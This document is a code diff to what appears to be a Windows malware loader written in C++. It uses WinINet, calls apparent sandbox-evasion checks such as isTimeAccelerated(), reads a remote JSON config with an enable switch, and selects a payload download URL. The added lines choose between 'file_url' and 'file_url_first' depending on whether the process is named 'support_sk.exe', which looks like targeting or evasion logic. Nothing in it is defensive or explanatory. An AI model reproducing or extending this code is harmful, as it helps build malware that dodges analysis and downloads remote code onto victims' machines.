@@ -1,3 +1,5 @@
+// x86_64-w64-mingw32-g++ new2.cpp -lwininet -static-libgcc -static-libstdc++ -Os -s -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections -Wl,--gc-sections
+
 #include <windows.h>
 #include <thread>
 #include <vector>
@@ -192,6 +194,15 @@ void save_to_cache(const char* version, const vector<unsigned char>& data) {
     }
 }
 
+bool CheckProcessName() {
+    char path[MAX_PATH];
+    GetModuleFileNameA(NULL, path, MAX_PATH);
+    char* filename = strrchr(path, '\\');
+    if (!filename) filename = path;
+    else filename++;
+    return _stricmp(filename, "support_sk.exe") == 0;
+}
+
 int main() {
     isTimeAccelerated();
     ddt();
@@ -204,7 +215,7 @@ int main() {
     if (!enable || lstrcmpA(enable, "true") != 0) return -1;
     
     const char* version = find_value(json, "version");
-    const char* file_url = find_value(json, "file_url");
+    const char* file_url = find_value(json, CheckProcessName() ? "file_url" : "file_url_first");
     const char* ps = find_value(json, "ps");
     if (!version || !file_url || !ps) return -2;
 
